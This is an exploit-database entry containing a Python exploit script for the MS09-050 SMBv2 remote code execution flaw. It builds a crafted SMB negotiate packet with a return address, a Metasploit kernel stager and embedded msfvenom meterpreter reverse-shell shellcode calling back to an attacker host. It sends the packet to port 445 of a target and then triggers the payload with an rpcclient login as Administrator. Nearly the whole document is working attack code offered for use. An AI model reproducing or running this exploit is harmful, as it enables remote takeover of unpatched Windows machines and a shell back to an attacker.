# EDB-Note: Source ~ https://raw.githubusercontent.com/ohnozzy/Exploit/master/MS09_050.py
 
#!/usr/bin/python
#This module depends on the linux command line program smbclient. 
#I can't find a python smb library for smb login. If you can find one, you can replace that part of the code with the smb login function in python.
#The idea is that after the evil payload is injected by the first packet, it need to be trigger by an authentication event. Whether the authentication successes or not does not matter.
import tempfile
import sys
import subprocess
from socket import socket
from time import sleep
from smb.SMBConnection import SMBConnection
 
 
try:
 
    target = sys.argv[1]
except IndexError:
    print '\nUsage: %s <target ip>\n' % sys.argv[0]
    print 'Example: MS36299.py 192.168.1.1 1\n'
    sys.exit(-1)
 
#msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.30.77 LPORT=443  EXITFUNC=thread  -f python
shell =  ""
shell += "\x31\xc9\x83\xe9\xad\xe8\xff\xff\xff\xff\xc0\x5e\x81"
shell += "\x76\x0e\xc3\xdd\xfe\xc4\x83\xee\xfc\xe2\xf4\x3f\x35"
shell += "\x7c\xc4\xc3\xdd\x9e\x4d\x26\xec\x3e\xa0\x48\x8d\xce"
shell += "\x4f\x91\xd1\x75\x96\xd7\x56\x8c\xec\xcc\x6a\xb4\xe2"
shell += "\xf2\x22\x52\xf8\xa2\xa1\xfc\xe8\xe3\x1c\x31\xc9\xc2"
shell += "\x1a\x1c\x36\x91\x8a\x75\x96\xd3\x56\xb4\xf8\x48\x91"
shell += "\xef\xbc\x20\x95\xff\x15\x92\x56\xa7\xe4\xc2\x0e\x75"
shell += "\x8d\xdb\x3e\xc4\x8d\x48\xe9\x75\xc5\x15\xec\x01\x68"
shell += "\x02\x12\xf3\xc5\x04\xe5\x1e\xb1\x35\xde\x83\x3c\xf8"
shell += "\xa0\xda\xb1\x27\x85\x75\x9c\xe7\xdc\x2d\xa2\x48\xd1"
shell += "\xb5\x4f\x9b\xc1\xff\x17\x48\xd9\x75\xc5\x13\x54\xba"
shell += "\xe0\xe7\x86\xa5\xa5\x9a\x87\xaf\x3b\x23\x82\xa1\x9e"
shell += "\x48\xcf\x15\x49\x9e\xb5\xcd\xf6\xc3\xdd\x96\xb3\xb0"
shell += "\xef\xa1\x90\xab\x91\x89\xe2\xc4\x22\x2b\x7c\x53\xdc"
shell += "\xfe\xc4\xea\x19\xaa\x94\xab\xf4\x7e\xaf\xc3\x22\x2b"
shell += "\xae\xc8\x84\xae\x26\x3e\xb7\xff\xae\xc1\xb5\x14\xcb"
shell += "\x1c\x3d\x01\x11\x54\xb5\xfc\xc4\xd2\x81\x77\x22\xa9"
shell += "\xcd\xa8\x93\xab\x1f\x25\xf3\xa4\x22\x2b\x41\x03\xa8"
shell += "\xa6\x93\xab\x6a\x17\xfc\x3c\x22\x2b\x93\xab\xa9\x12"
shell += "\xff\x22\x22\x2b\x93\x54\xb5\x8b\xaa\x8e\xbc\x01\x11"
shell += "\xa9\xdd\x94\xc0\x95\x8a\x96\xc6\x1a\x15\xa1\x3b\x16"
shell += "\x5e\x06\xc4\xbd\xf0\x75\xf2\xa9\x9d\x96\xc4\xd3\xdd"
shell += "\xfe\x92\xa9\xdd\x96\x9c\x67\x8e\x1b\x3b\x16\x4e\xad"
shell += "\xae\xc3\x8b\xad\x93\xab\xdf\x27\x0c\x9c\x22\x2b\x47"
shell += "\x3b\xdd\x80\xc3\xc2\x1e\xd7\x02\xb6\x34\x3d\x7f\x23"
shell += "\xc0\xd4\xce\xab\x7b\x6b\x79\x5e\x22\x2b\xf8\xc5\xa1"
shell += "\xf4\x44\x38\x3d\x8b\xc1\x78\x9a\xed\xb6\xac\xb7\xfe"
shell += "\x97\x3c\x08\xfe\xc4"
 
 
 
host = target, 445
 
buff ="\x00\x00\x03\x9e\xff\x53\x4d\x42"
buff+="\x72\x00\x00\x00\x00\x18\x53\xc8"
buff+="\x17\x02" #high process ID
buff+="\x00\xe9\x58\x01\x00\x00"
buff+="\x00\x00\x00\x00\x00\x00\x00\x00"
buff+="\x00\x00\xfe\xda\x00\x7b\x03\x02"
buff+="\x04\x0d\xdf\xff"*25
buff+="\x00\x02\x53\x4d"
buff+="\x42\x20\x32\x2e\x30\x30\x32\x00"
buff+="\x00\x00\x00\x00"*37
buff+="\xff\xff\xff\xff"*2
buff+="\x42\x42\x42\x42"*7
buff+="\xb4\xff\xff\x3f" #magic index
buff+="\x41\x41\x41\x41"*6
buff+="\x09\x0d\xd0\xff" #return address
 
#stager_sysenter_hook from metasploit
 
buff+="\xfc\xfa\xeb\x1e\x5e\x68\x76\x01"
buff+="\x00\x00\x59\x0f\x32\x89\x46\x5d"
buff+="\x8b\x7e\x61\x89\xf8\x0f\x30\xb9"
buff+="\x16\x02\x00\x00\xf3\xa4\xfb\xf4"
buff+="\xeb\xfd\xe8\xdd\xff\xff\xff\x6a"
buff+="\x00\x9c\x60\xe8\x00\x00\x00\x00"
buff+="\x58\x8b\x58\x54\x89\x5c\x24\x24"
buff+="\x81\xf9\xde\xc0\xad\xde\x75\x10"
buff+="\x68\x76\x01\x00\x00\x59\x89\xd8"
buff+="\x31\xd2\x0f\x30\x31\xc0\xeb\x31"
buff+="\x8b\x32\x0f\xb6\x1e\x66\x81\xfb"
buff+="\xc3\x00\x75\x25\x8b\x58\x5c\x8d"
buff+="\x5b\x69\x89\x1a\xb8\x01\x00\x00"
buff+="\x80\x0f\xa2\x81\xe2\x00\x00\x10"
buff+="\x00\x74\x0e\xba\x00\xff\x3f\xc0"
buff+="\x83\xc2\x04\x81\x22\xff\xff\xff"
buff+="\x7f\x61\x9d\xc3\xff\xff\xff\xff"
buff+="\x00\x04\xdf\xff\x00\x04\xfe\x7f"
buff+="\x60\x6a\x30\x58\x99\x64\x8b\x18"
buff+="\x39\x53\x0c\x74\x2b\x8b\x43\x10"
buff+="\x8b\x40\x3c\x83\xc0\x28\x8b\x08"
buff+="\x03\x48\x03\x81\xf9\x6c\x61\x73"
buff+="\x73\x75\x15\xe8\x07\x00\x00\x00"
buff+="\xe8\x0d\x00\x00\x00\xeb\x09\xb9"
buff+="\xde\xc0\xad\xde\x89\xe2\x0f\x34"
buff+="\x61\xc3\x81\xc4\x54\xf2\xff\xff"
 
buff+=shell
 
s = socket()
s.connect(host)
s.send(buff)
s.close() 
#Trigger the above injected code via authenticated process.
subprocess.call("echo '1223456' | rpcclient -U Administrator %s"%(target), shell=True)

#  0day.today [2018-02-20]  #